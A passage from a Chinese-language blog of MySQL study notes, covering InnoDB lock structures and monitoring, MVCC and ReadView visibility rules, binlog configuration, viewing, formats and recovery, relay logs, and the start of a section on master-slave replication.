<li><p>行锁的具体类型（ rec_lock_type ），使用其余的位来表示。只有在 lock_type 的值为</p>
<ul>
<li>LOCK_REC 时，也就是只有在该锁为行级锁时，才会被细分为更多的类型：</li>
<li>LOCK_ORDINARY （十进制的 0 ）：表示 next-key锁 。</li>
<li>LOCK_GAP （十进制的 512 ）：也就是当第10个比特位置为1时，表示 gap锁 。</li>
<li>LOCK_REC_NOT_GAP （十进制的 1024 ）：也就是当第11个比特位置为1时，表示正经 记录锁 。</li>
<li>LOCK_INSERT_INTENTION （十进制的 2048 ）：也就是当第12个比特位置为1时，表示插入意向锁。其他的类型：还有一些不常用的类型我们就不多说了。</li>
</ul>
</li>
<li><p>is_waiting 属性呢？基于内存空间的节省，所以把 is_waiting 属性放到了 type_mode 这个32位的数字中：</p>
<ul>
<li>LOCK_WAIT （十进制的 256 ） ：当第9个比特位置为 1 时，表示 is_waiting 为 true ，也就是当前事务尚未获取到锁，处在等待状态；当这个比特位为 0 时，表示 is_waiting 为false ，也就是当前事务获取锁成功。</li>
</ul>
</li>
<li><p>其他信息 ：<br> 为了更好的管理系统运行过程中生成的各种锁结构而设计了各种哈希表和链表。</p>
</li>
<li><p>一堆比特位 ：如果是 行锁结构 的话，在该结构末尾还放置了一堆比特位，比特位的数量是由上边提到的 n_bits 属性表示的。InnoDB数据页中的每条记录在 记录头信息 中都包含一个 heap_no 属性，伪记录 Infimum 的heap_no 值为 0 ， Supremum 的 heap_no 值为 1 ，之后每插入一条记录， heap_no 值就增1。 锁结构 最后的一堆比特位就对应着一个页面中的记录，一个比特位映射一个 heap_no ，即一个比特位映射到页内的一条记录。</p>
</li>
</ol>
<h3 id="锁监控"><a href="#锁监控" class="headerlink" title="锁监控"></a>锁监控</h3><p>查看数据库中当前锁的情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show status like &#x27;innodb_row_lock%&#x27;;</span><br><span class="line">-- 查询结果参数说明</span><br><span class="line">-- Innodb_row_lock_current_waits：当前正在等待锁定的数量；</span><br><span class="line">-- Innodb_row_lock_time ：从系统启动到现在锁定总时间长度；（等待总时长）</span><br><span class="line">-- Innodb_row_lock_time_avg ：每次等待所花平均时间；（等待平均时长）</span><br><span class="line">-- Innodb_row_lock_time_max：从系统启动到现在等待最常的一次所花的时间；</span><br><span class="line">-- Innodb_row_lock_waits ：系统启动后到现在总共等待的次数；（等待总次数）</span><br></pre></td></tr></table></figure>

<p>其他监控方法：MySQL把事务和锁的信息记录在了 information_schema 库中，涉及到的三张表分别是<code>INNODB_TRX</code> 、 INNODB_LOCKS 和 INNODB_LOCK_WAITS 。8.0以后后两个表分别被performance_schema.data_locks，performance_schema.data_lock_waits 所代替</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- (1) 查询正在被锁阻塞的sql语句。</span><br><span class="line">SELECT * FROM information_schema.INNODB_TRX\G;</span><br><span class="line">-- (2) 查询锁等待情况</span><br><span class="line">SELECT * FROM performance_schema.data_lock_waits\G;</span><br><span class="line">-- (3) 查询锁的情况</span><br><span class="line">SELECT * from performance_schema.data_locks\G;</span><br></pre></td></tr></table></figure>





<h2 id="多版本并发控制-MVCC"><a href="#多版本并发控制-MVCC" class="headerlink" title="多版本并发控制 MVCC"></a>多版本并发控制 MVCC</h2><p>MVCC （Multiversion Concurrency Control），多版本并发控制。顾名思义，MVCC 是通过数据行的多个版本管理来实现数据库的<code>并发控制</code> 。这项技术使得在InnoDB的事务隔离级别下执行 <code>一致性读</code> 操作有了保证。换言之，就是为了查询一些正在被另一个事务更新的行，并且可以看到它们被更新之前的值，这样在做查询的时候就不用等待另一个事务释放锁MVCC在MySQL InnoDB中的实现主要是为了提高数据库并发性能，用更好的方式去处理 <code>读-写冲突</code> ，做到即使有读写冲突时，也能做到<code>不加锁</code> ， <code>非阻塞并发读</code> ，而这个读指的就是<code>快照读</code> , 而非<code>当前读</code> 。当前读实际上是一种加锁的操作，是悲观锁的实现。而MVCC本质是采用乐观锁思想的一种方式。</p>
<ul>
<li>是在 <strong>事务隔离级别</strong>为 <strong>可重复读（Repeatable Read）</strong> 和 <strong>串行化（Serializable）</strong> 时的一种多版本控制机制</li>
<li><strong>MVCC的实现依赖于：隐藏字段，undo log，ReadView</strong></li>
<li>在隔离级别为<code>读已提交（Read Committed）</code>时，一个事务中的<code>每一次 </code>SELECT 查询都会重新获取一次Read View。</li>
<li>在隔离级别为<code>可重复读（REPEATABLE READ）</code>时，一个事务中的<code>第一次</code> SELECT 查询都会重新获取一次Read View。</li>
</ul>
<h3 id="快照读和当前读"><a href="#快照读和当前读" class="headerlink" title="快照读和当前读"></a>快照读和当前读</h3><h4 id="快照读"><a href="#快照读" class="headerlink" title="快照读"></a>快照读</h4><p>快照读又叫一致性读，读取的是快照数据。不加锁的简单的 SELECT 都属于快照读，即<code>不加锁的非阻塞读</code>；之所以出现快照读的情况，是基于提高并发性能的考虑，快照读的实现是基于MVCC，它在很多情况下，避免了加锁操作，降低了开销。既然是基于多版本，那么快照读可能读到的并不一定是数据的最新版本，而有可能是之前的历史版本。快照读的前提是<code>隔离级别不是串行级别</code>，串行级别下的快照读会退化成当前读。</p>
<h4 id="当前读"><a href="#当前读" class="headerlink" title="当前读"></a>当前读</h4><p>当前读读取的是记录的最新版本（最新数据，而不是历史版本的数据），读取时还要保证其他并发事务不能修改当前记录，会对读取的记录进行<code>加锁</code>。加锁的 SELECT，或者对数据进行增删改都会进行当前读。</p>
<h3 id="MVCC原理三板斧：隐藏字段，UNDO-LOG版本链"><a href="#MVCC原理三板斧：隐藏字段，UNDO-LOG版本链" class="headerlink" title="MVCC原理三板斧：隐藏字段，UNDO LOG版本链"></a>MVCC原理三板斧：隐藏字段，UNDO LOG版本链</h3><p>innoDB存储引擎中，聚簇索引记录都包含两个必要的隐藏字段：</p>
<ul>
<li><code>trx_id </code>：每次一个事务对某条聚簇索引记录进行改动时，都会把该事务的 <strong>事务id</strong> 赋值给trx_id 隐藏列</li>
<li><code>roll_pointer</code> ：每次对某条聚簇索引记录进行改动时，都会把旧的版本写入到 <strong>undo日志</strong> 中，然后这个隐藏列相当于一个指针，可以通过它来找到该记录修改对应的undo日志记录</li>
</ul>
<p>UNDO LOG日志可以见上文</p>
<h3 id="MVCC原理三板斧：ReadView"><a href="#MVCC原理三板斧：ReadView" class="headerlink" title="MVCC原理三板斧：ReadView"></a>MVCC原理三板斧：ReadView</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>在 <strong>事务隔离级别</strong>为 <strong>可重复读（Repeatable Read）</strong> 和 <strong>串行化（Serializable）</strong> 时，确保在事务执行期间，能够读取一致的数据快照，而不受其他事务的修改影响。ReadView要解决的主要问题是判断版本链中的哪个版本是当前事务可见的。在事务执行时，特别是在 <strong>可重复读</strong>（Repeatable Read）隔离级别下，InnoDB 会创建一个 <strong>ReadView</strong>。这个 ReadView 会记录当前所有活跃事务的事务ID，并定义一个“<strong>快照</strong>”视图，确保查询操作只看到“<strong>可见的</strong>”数据版本。</p>
<p>具体来说，ReadView 在以下条件下会生成：</p>
<ul>
<li>当一个事务开始时，InnoDB 会创建一个 <strong>ReadView</strong>，并记录当前活跃事务的事务ID。</li>
<li>事务ID小于当前事务ID并且已经提交的事务所做的更改对当前事务可见。</li>
<li>事务ID大于当前事务ID的事务所做的更改对当前事务不可见，因为它们在当前事务开始之后提交。</li>
</ul>
<h4 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h4><p>ReadView中主要包含4个比较重要的内容，分别如下：</p>
<ol>
<li><code>creator_trx_id</code>，创建这个 Read View 的事务 ID。</li>
</ol>
<blockquote>
<p>说明：只有在对表中的记录做改动时（执行INSERT、DELETE、UPDATE这些语句时）才会为事务分配事务id，否则在一个只读事务中的事务id值都默认为0。</p>
</blockquote>
<ol start="2">
<li><p><code>trx_ids</code>，表示在生成ReadView时当前系统中活跃的读写事务的 <code>事务id列表</code> 。</p>
</li>
<li><p><code>up_limit_id</code>，活跃的事务中<code>最小的事务</code> ID。</p>
</li>
<li><p><code>low_limit_id</code>，表示生成ReadView时系统中应该<code>分配给下一个事务</code>的 id 值。low_limit_id 是系统最大的事务id值，这里要注意是系统中的事务id，需要区别于正在活跃的事务ID</p>
</li>
</ol>
<blockquote>
<p>注意：low_limit_id并不是trx_ids中的最大值，事务id是递增分配的。比如，现在有id为1，2，3这三个事务，之后id为3的事务提交了。那么一个新的读事务在生成ReadView时，trx_ids就包括1和2，up_limit_id的值就是1，low_limit_id的值就是4。</p>
</blockquote>
<h4 id="readview-规则"><a href="#readview-规则" class="headerlink" title="readview 规则"></a>readview 规则</h4><p>规则如下：</p>
<ol>
<li>如果被访问版本的trx_id属性值与ReadView中的 <code>creator_trx_id</code>(创建当前readview的事务id) 值<code>相同</code>，意味着当前事务在访问它自己修改过的记录，所以该版本可以被当前事务访问。、</li>
<li>如果被访问版本的trx_id属性值<code>小于</code>ReadView中的 <code>up_limit_id</code> (创建当前readview时活跃的最小事务id)值，表明生成该版本的事务在当前事务生成ReadView前已经提交，所以该版本可以被当前事务访问。</li>
<li>如果被访问版本的trx_id属性值<code>大于或等于</code>ReadView中的 <code>low_limit_id</code> (创建当前readview后若出现新事务对应id)值，表明生成该版本的事务在当前事务生成ReadView后才开启，所以该版本不可以被当前事务访问。</li>
<li>如果被访问版本的trx_id属性值在ReadView的<code>up_limit_id和low_limit_id之间</code>，那就需要判断一下trx_id属性值是不是在<code>trx_ids</code>列表中。<ol>
<li>如果在，说明创建ReadView时生成该版本的事务还是活跃的，该版本不可以被访问。</li>
<li>如果不在，说明创建ReadView时生成该版本的事务已经被提交，该版本可以被访问。</li>
</ol>
</li>
</ol>
<h4 id="MVCC操作流程及示例"><a href="#MVCC操作流程及示例" class="headerlink" title="MVCC操作流程及示例"></a>MVCC操作流程及示例</h4><p>在隔离级别为<code>读已提交（Read Committed）</code>时，一个事务中的<code>每一次 </code>SELECT 查询都会重新获取一次Read View。</p>
<p>在隔离级别为<code>可重复读（REPEATABLE READ）</code>时，一个事务中的<code>第一次</code> SELECT 查询都会重新获取一次Read View。</p>
<ol>
<li><p>首先获取事务自己的版本号，也就是事务 ID；</p>
</li>
<li><p>获取 ReadView；</p>
</li>
<li><p>查询得到的数据，然后与 ReadView 中的事务版本号进行比较；</p>
</li>
<li><p>如果不符合 ReadView 规则，就需要从 Undo Log 中获取历史快照；</p>
</li>
<li><p>最后返回符合规则的数据</p>
</li>
</ol>
<p>举例：</p>
<p><a href="https://www.bilibili.com/video/BV1iq4y1u7vj?spm_id_from=333.788.player.switch&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=185">两种隔离级别下MVCC工作机制</a></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241207211010.png" alt="UNDO日志链"></p>
<h4 id="MVCC-如何解决可重复读下幻读问题"><a href="#MVCC-如何解决可重复读下幻读问题" class="headerlink" title="MVCC 如何解决可重复读下幻读问题"></a>MVCC 如何解决可重复读下幻读问题</h4><p>在隔离级别为<code>可重复读（REPEATABLE READ）</code>时，一个事务中的<code>第一次</code> SELECT 查询都会重新获取一次Read View。因此再次读取时使用的仍然是第一次读取的readview，即使两次读取之间有其他事务进行了插入操作，但由于其他事务必然是在创建readview时是活跃的或不存在的，所以根据第三条规则或第4条规则的第一项，插入的记录都不会被读取。</p>
<h1 id="日志和备份"><a href="#日志和备份" class="headerlink" title="日志和备份"></a>日志和备份</h1><h2 id="其他数据库日志"><a href="#其他数据库日志" class="headerlink" title="其他数据库日志"></a>其他数据库日志</h2><p><a href="https://dev.mysql.com/doc/refman/8.0/en/server-logs.html">MySQL日志官方文档</a></p>
<h3 id="MySQL支持的日志"><a href="#MySQL支持的日志" class="headerlink" title="MySQL支持的日志"></a>MySQL支持的日志</h3><h4 id="日志的类型"><a href="#日志的类型" class="headerlink" title="日志的类型"></a>日志的类型</h4><p>MySQL有不同类型的日志文件，用来存储不同类型的日志，分为<code>二进制日志</code>、<code>错误日志</code>、<code>通用查询日志</code>和<code>慢查询日志</code>，这也是常用的4种。MySQL8又新增两种支持的日志：<code>中继日志</code>和<code>数据定义语句日志</code>。使用这些日志文件，可以查看MySQL内部发生的事情。这6类日志分别为：</p>
<ul>
<li><code>慢查询日志</code>：记录所有执行时间超过long_query_time的所有查询，方便我们对查询进行优化。</li>
<li><code>通用查询日志</code>：记录所有连接的起始时间和终止时间，以及连接发送给数据库服务器的所有指令，对我们复原操作的实际场景、发现问题，甚至是对数据库操作的审计都有很大的帮助。</li>
<li><code>错误日志</code>：记录MySQL服务的启动、运行或停止MySQL服务时出现的问题，方便我们了解服务器的状态，从而对服务器进行维护。</li>
<li><code>二进制日志</code>：记录所有更改数据的语句，可以用于主从服务器之间的数据同步，以及服务器遇到故障时数据的无损失恢复。</li>
<li><code>中继日志</code>：用于主从服务器架构中，从服务器用来存放主服务器二进制日志内容的一个中间文件。从服务器通过读取中继日志的内容，来同步主服务器上的操作。</li>
<li><code>数据定义语句日志</code>：记录数据定义语句执行的元数据操作。除二进制日志外，其他日志都是文本文件。默认情况下，所有日志创建于MySQL数据目录中。</li>
</ul>
<h4 id="日志的弊端"><a href="#日志的弊端" class="headerlink" title="日志的弊端"></a>日志的弊端</h4><p>日志功能会降低MySQL数据库的性能。<br>日志会占用大量的磁盘空间。</p>
<h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p>性能分析章节已经详细s</p>
<h3 id="通用查询日志"><a href="#通用查询日志" class="headerlink" title="通用查询日志"></a>通用查询日志</h3><p>通用查询日志用来<code>记录用户的所有操作</code>，包括启动和关闭MySQL服务、所有用户的连接开始时间和截止时间、发给 MySQL 数据库服务器的所有 SQL 指令等。当我们的数据发生异常时，查看通用查询日志，还原操作时的具体场景，可以帮助我们准确定位问题。<code>默认是关闭状态。</code></p>
<p><strong>相关重要操作如下：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查看当前通用查询日志状态</span><br><span class="line">show variables like &#x27;%general%&#x27;</span><br><span class="line">-- 启动日志（临时）</span><br><span class="line">set global general_log = on;</span><br><span class="line">-- 设置日志文件位置和名称（临时）</span><br><span class="line">set global general_log_file = &#x27;path/to/filename.log&#x27;; </span><br><span class="line"></span><br><span class="line">-- 删除日志：通过第一条命令获取日志存储位置后手动删除</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>永久修改通用查询日志：</strong>需要修改my.cnf或my.ini配置文件，在[mysqld]组下假如log选项后重启MySQL服务：</p>
<blockquote>
<p>[myslqd]</p>
<p>general_log &#x3D;ON</p>
<p>general_log_file &#x3D; path&#x2F;to&#x2F;file.log</p>
</blockquote>
<h3 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h3><p>错误日志记录了MySQL服务器启动，停止运行的时间，以及系统启动，运行和停止过程中的诊断信息，包括<code>错误</code>，<code>警告</code>和<code>提示</code>等。通过错误日志可以查看系统的运行状态，便于及时发现和修复故障，如果MySQLf服务<code>出现异常</code>，错误日志是发现和解决故障的<code>首选</code>。<code>默认是开启状态且不可关闭</code></p>
<p>查看和删除日志均可直接在终端进行文件操作，修改文件名需要修改配置文件并重启：</p>
<blockquote>
<p>[mysqld]</p>
<p>log-error &#x3D; [path&#x2F;[filename]]</p>
</blockquote>
<p>创建新的日志文件需要三步：</p>
<blockquote>
<ol>
<li>终端mv命令重命名原文件</li>
<li>install -omysql -gmysql -m0644 &#x2F;dev&#x2F;null &#x2F;var&#x2F;log&#x2F;mysqld.log  (5.5.7开始才需要此命令)</li>
<li>mysqladmin -uroot -p flush-logs</li>
</ol>
</blockquote>
<h3 id="二进制日志"><a href="#二进制日志" class="headerlink" title="二进制日志"></a>二进制日志</h3><p>binlog即binary log，二进制日志文件，也叫作变更日志（update log）,是MySQL中比较<code>重要</code>的日志了，在日常开发及运维过程中，经常会遇到。binlog它以<strong>事件形式记录了数据库所有执行的DDL 和 DML 等数据库更新事件的语句，</strong>但是不包含没有修改任何数据的语句（如数据查询语句select、show等）。<strong>不是所有MySQL版本都默认开启二进制日志</strong><br><strong>binlog主要应用场景：</strong></p>
<ul>
<li><strong>数据恢复</strong></li>
<li><strong>数据复制</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241208211337.png"></p>
<h4 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查看二进制日志相关参数</span><br><span class="line">show variables like &#x27;%log_bin%&#x27;</span><br><span class="line">-- 参数说明：分别表示二进制日志开启情况，二进制日志文件存储位置，二进制日志文件索引，是否信任函数等</span><br></pre></td></tr></table></figure>

<p>每次重启服务器都会创建一个二进制日志文件。</p>
<p><strong>日志参数设置</strong></p>
<p>方式1：<strong>永久性方式：修改MySQL的 my.cnf 或 my.ini 文件可以设置二进制日志的相关参数，需要重新启动MySQL服务</strong></p>
<blockquote>
<p>mysqld]<br>#启用二进制日志<br>log-bin&#x3D;atguigu-bin   #生成的二进制文件名称<br>binlog_expire_logs_seconds&#x3D;600  #二进制日志文件保存的时间<br>max_binlog_size&#x3D;100M  #二进制日志文件上限大小，默认1GB，最大也是1GB，同一个事务即使到1GB仍然记录在同一个文件</p>
</blockquote>
<p>方式2：临时修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set session sql_log_bin = 0; #先查看相关参数，根据需要修改</span><br></pre></td></tr></table></figure>



<h4 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h4><p>当MySQL创建二进制日志文件时，先创建一个以“filename”为名称、以“.index”为后缀的文件，再创建一个以“filename”为名称、以“.000001”为后缀的文件。MySQL服务<strong>重新启动一次</strong>，以“.000001”为后缀的文件就会增加一个，并且后缀名按1递增。即日志文件的个数与MySQL服务启动的次数相同；如果日志长度超过了 max_binlog_size 的上限（默认是1GB），就<br>会创建一个新的日志文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查看当前的二进制日志文件列表及大小。指令如下：</span><br><span class="line">SHOW BINARY LOGS;</span><br><span class="line">-- 查看日志记录，以伪SQL的形式</span><br><span class="line">mysqlbinlog -v &quot;/var/lib/mysql/binlog/atguigu-bin.000002&quot;</span><br><span class="line"># 可查看参数帮助</span><br><span class="line">mysqlbinlog --no-defaults --help</span><br><span class="line"># 查看最后100行</span><br><span class="line">mysqlbinlog --no-defaults --base64-output=decode-rows -vv atguigu-bin.000002 |tail -100</span><br><span class="line"># 根据position查找</span><br><span class="line">mysqlbinlog --no-defaults --base64-output=decode-rows -vv atguigu-bin.000002 |grep -A 20 &#x27;4939002&#x27;</span><br></pre></td></tr></table></figure>

<p>上面这种办法读取出binlog日志的全文内容比较多，不容易分辨查看到pos点信息，下面介绍一种更为方便的查询命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show binlog events [IN &#x27;log_name&#x27;] [FROM pos] [LIMIT [offset,] row_count];</span><br><span class="line">-- 例如</span><br><span class="line">show binlog events in &#x27;SYF-COMPUTE-bin.000393&#x27;;</span><br><span class="line">show binlog events in &#x27;SYF-COMPUTE-bin.000393&#x27; from 4 limit 1,1;</span><br></pre></td></tr></table></figure>

<ul>
<li>IN ‘log_name’ ：指定要查询的binlog文件名（不指定就是第一个binlog文件）</li>
<li>FROM pos ：指定从哪个pos起始点开始查起（不指定就是从整个文件首个pos点开始算）</li>
<li>LIMIT [offset] ：偏移量(不指定就是0)</li>
<li>row_count :查询总条数（不指定就是所有行）</li>
</ul>
<h4 id="binlog的格式"><a href="#binlog的格式" class="headerlink" title="binlog的格式"></a>binlog的格式</h4><p>binlog有三种格式：binlog_format&#x3D;</p>
<ul>
<li><code>Statement</code>：每一条会修改数据的sql语句会记录到binlog中。这是默认的binlog格式。<ul>
<li>优点：不需要记录每一行的变化，减少了binlog日志量，节约了IO，提高性能，binlog中包含了所有数据库更改信息，可以据此来审核数据库的安全等情况；binlog可以用于实时的还原，而不仅仅用于复制；主从版本可以不一样，从服务器版本可以比主服务器版本高</li>
<li>缺点：<ul>
<li>不是所有的UPDATE语句都能被复制，尤其是包含不确定操作的时候</li>
<li>使用以下函数的语句也无法被复制：LOAD_FILE()、UUID()、USER()、FOUND_ROWS()、SYSDATE()(除非启动时启用了 –sysdate-is-now 选项)INSERT … SELECT 会产生比 RBR 更多的行级锁</li>
<li>复制需要进行全表扫描(WHERE 语句中没有使用到索引)的 UPDATE 时，需要比 RBR 请求更多的行级锁</li>
<li>对于有 AUTO_INCREMENT 字段的 InnoDB表而言，INSERT 语句会阻塞其他 INSERT 语句</li>
<li>对于一些复杂的语句，在从服务器上的耗资源情况会更严重，而 RBR 模式下，只会对那个发生变化的记录产生影响</li>
<li>执行复杂语句如果出错的话，会消耗更多资源</li>
<li>数据表必须几乎和主服务器保持一致才行，否则可能会导致复制出错</li>
</ul>
</li>
</ul>
</li>
<li><code>Row</code>：5.1.5版本的MySQL才开始支持row level 的复制，它不记录sql语句上下文相关信息，仅保存哪条记录被修改。<ul>
<li>优点：<ul>
<li>任何情况都可以被复制，这对复制来说是最 安全可靠 的。（比如：不会出现某些特定情况下的存储过程、function、trigger的调用和触发无法被正确复制的问题）</li>
<li>多数情况下，从服务器上的表如果有主键的话，复制就会快了很多</li>
<li>复制以下几种语句时的行锁更少：INSERT … SELECT、包含 AUTO_INCREMENT 字段的 INSERT、没有附带条件或者并没有修改很多记录的 UPDATE 或 DELETE 语句</li>
<li>执行 INSERT，UPDATE，DELETE 语句时锁更少</li>
<li>从服务器上采用 多线程 来执行复制成为可能</li>
</ul>
</li>
<li>缺点：<ul>
<li>binlog 大了很多</li>
<li>复杂的回滚时 binlog 中会包含大量的数据</li>
<li>主服务器上执行 UPDATE 语句时，所有发生变化的记录都会写到 binlog 中，而 SBR 只会写一次，这会导致频繁发生 binlog 的并发写问题</li>
<li>无法从 binlog 中看到都复制了些什么语句</li>
</ul>
</li>
</ul>
</li>
<li><code>Mixed</code>：从5.1.8版本开始，MySQL提供了Mixed格式，实际上就是Statement与Row的结合。一般的语句修改使用statment格式保存binlog。如一些函数，statement无法完成主从复制的操作，则采用row格式保存binlog。MySQL会根据执行的每一条具体的sql语句来区分对待记录的日志形式，也就是在Statement和Row之间选择一种。</li>
</ul>
<h4 id="BinLog实现数据恢复"><a href="#BinLog实现数据恢复" class="headerlink" title="BinLog实现数据恢复"></a>BinLog实现数据恢复</h4><p>命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqlbinlog [option] filename|mysql –uuser -ppass</span><br></pre></td></tr></table></figure>

<p><a href="https://www.bilibili.com/video/BV1iq4y1u7vj?spm_id_from=333.788.videopod.episodes&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=189">二进制日志恢复数据</a></p>
<h4 id="二进制日志的删除"><a href="#二进制日志的删除" class="headerlink" title="二进制日志的删除"></a>二进制日志的删除</h4><p>MySQL的二进制文件可以配置自动删除，同时MySQL也提供了安全的手动删除二进制文件的方法。<code>PURGE MASTER LOGS </code>只删除指定部分的二进制日志文件， <code>RESET MASTER</code> 删除所有的二进制日志文<br>件。具体如下：</p>
<p><strong>一、PURGE MASTER LOGS：删除指定日志文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 按时间名删除</span><br><span class="line">PURGE &#123;MASTER | BINARY&#125; LOGS TO ‘指定日志文件名’</span><br><span class="line">-- 按时间删除</span><br><span class="line">-- 首先在shell使用命令查看文件创建日志</span><br><span class="line">mysqlbinlog --no-defaults &#x27;path/to/binlog&#x27;</span><br><span class="line">-- 然后删除日期前创建的所有日志文件</span><br><span class="line">PURGE &#123;MASTER | BINARY&#125; LOGS BEFORE &#x27;20220101&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>二、RESET MASTER 删除所有的二进制日志文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reset master</span><br><span class="line">-- !!!!实际开发中绝不可使用！！！数据将不可恢复！</span><br></pre></td></tr></table></figure>



<h4 id="binlog的机制"><a href="#binlog的机制" class="headerlink" title="binlog的机制"></a>binlog的机制</h4><h5 id="写入机制"><a href="#写入机制" class="headerlink" title="写入机制"></a>写入机制</h5><p>binlog的写入时机也非常简单，事务执行过程中，先把日志写到 binlog cache ，事务提交的时候，再把binlog cache写到binlog文件中。因为一个事务的binlog不能被拆开，无论这个事务多大，也要确保一次性写入，所以系统会给每个线程分配一个块内存作为binlog cache.</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241210193748.png"></p>
<p>write和fsync的时机，可以由参数 sync_binlog 控制，默认是 0 。为0的时候，表示每次提交事务都只write，由系统自行判断什么时候执行fsync。虽然性能得到提升，但是机器宕机，page cache里面的binglog 会丢失。为了安全起见，可以设置为 1 ，表示每次提交事务都会执行fsync，就如同redo log 刷盘流程一样。最后还有一种折中方式，可以设置为N(N&gt;1)，表示每次提交事务都write，但累积N个事务后才fsync。在出现IO瓶颈的场景里，将sync_binlog设置成一个比较大的值，可以提升性能。同样的，如果机器宕机，会丢失最近N个事务的binlog日志。</p>
<p><strong>redo log 和bin log的对比</strong>、</p>
<ul>
<li>redo log 是 物理日志 ，记录内容是“在某个数据页上做了什么修改”，属于 InnoDB 存储引擎层产生的。</li>
<li>binlog 是 逻辑日志 ，记录内容是语句的原始逻辑，类似于“给 ID&#x3D;2 这一行的 c 字段加 1”，属于MySQL Server 层</li>
</ul>
<h5 id="两阶段提交"><a href="#两阶段提交" class="headerlink" title="两阶段提交"></a>两阶段提交</h5><p>在执行更新语句过程，会记录redo log与binlog两块日志，以基本的事务为单位，redo log在事务执行过程中可以不断写入，而binlog只有在提交事务时才写入，所以redo log与binlog的 写入时机 不一样。主从复制情况下，从机参考的是主机的binlog日志，如果主机的redo log写入成功而binlog写入失败，则主机所做的修改就是持久化的，会导致主从不一致，因此需要两阶段提交的机制。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241210194531.png"></p>
<h4 id="中继日志"><a href="#中继日志" class="headerlink" title="中继日志"></a>中继日志</h4><p>中继日志只在主从服务器架构的从服务器上存在。从服务器为了与主服务器保持一致，要从主服务器读取二进制日志的内容，并且把读取到的信息写入 <code>本地的日志文件</code> 中，这个从服务器本地的日志文件就叫<code>中继日志</code> 。然后，从服务器读取中继日志，并根据中继日志的内容对从服务器的数据进行更新，完成主从服务器的 <code>数据同步</code> 。搭建好主从服务器之后，中继日志默认会保存在从服务器的数据目录下。</p>
<p>文件名的格式是： 从服务器名 -relay-bin.序号 。</p>
<p>中继日志还有一个索引文件： 从服务器名 -relay-bin.index ，用来定位当前正在使用的中继日志。</p>
<p><strong>查看中继日志</strong></p>
<p>中继日志与二进制日志的格式相同，可以用 mysqlbinlog 工具进行查看。</p>
<h4 id="数据恢复的典型错误"><a href="#数据恢复的典型错误" class="headerlink" title="数据恢复的典型错误"></a><strong>数据恢复的典型错误</strong></h4><p>如果从服务器宕机，有的时候为了系统恢复，要重装操作系统，这样就可能会导致你的 服务器名称 与之前 不同 。而中继日志里是 包含从服务器名 的。在这种情况下，就可能导致你恢复从服务器的时候，无法从宕机前的中继日志里读取数据，以为是日志文件损坏了，其实是名称不对了。解决的方法也很简单，把从服务器的名称改回之前的名称。</p>
<h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><h3 id="基本概述"><a href="#基本概述" class="headerlink" title="基本概述"></a>基本概述</h3><h4 id="如何提高数据库并发能力"><a href="#如何提高数据库并发能力" class="headerlink" title="如何提高数据库并发能力"></a>如何提高数据库并发能力</h4><p>实际工作中常常将<code>redis</code>作为缓存与MySQL配合使用，当有请求时，首先从缓存中查找，存在则直接取出，不存在则访问数据库.</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241210210423.png"></p>
<p>同时由于一般的应用对数据库都是<code>读多写少</code>，所以常常采用数据库集群方案，通过<code>主从架构</code>实现读写分离。<strong>提高数据库并发访问的效率，首先考虑优化SQL和索引，然后是使用缓存的策略，最后才是数据库采用主从架构实现读写分离。</strong></p>
<h4 id="主从复制的作用"><a href="#主从复制的作用" class="headerlink" title="主从复制的作用"></a>主从复制的作用</h4><ul>
<li><p>读写分离：主库写入，多个从库用于读取。提高并发效率，减少锁表影响。</p>
<p>  <img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241210211507.png"></p>
</li>
<li><p>数据备份：热备份机制</p>
</li>
<li><p>高可用性：冗余可以避免单个服务器宕机影响服务正常的运行。可以写入的读库服务器也称备份服务器。</p>
</li>
</ul>
<h4 id="主从复制的原理"><a href="#主从复制的原理" class="headerlink" title="主从复制的原理"></a>主从复制的原理</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241210211846.png"></p>
<p>主从同步基于 binlog 进行数据同步，在主从复制过程中，会基于 <strong>3 个线程</strong> 来操作，一个主库线程，两个从库线程。</p>
<ul>
<li><code>二进制日志转储线程 </code>（Binlog dump thread）是一个主库线程。当从库线程连接的时候， 主库可以将二进制日志发送给从库，当主库读取事件（Event）的时候，会在 Binlog 上 加锁 ，读取完成之后，再将锁释放掉。</li>
<li><code>从库 I/O 线程</code> 会连接到主库，向主库发送请求更新 Binlog。这时从库的 I&#x2F;O 线程就可以读取到主库的二进制日志转储线程发送的 Binlog 更新部分，并且拷贝到本地的中继日志 （Relay log）。</li>
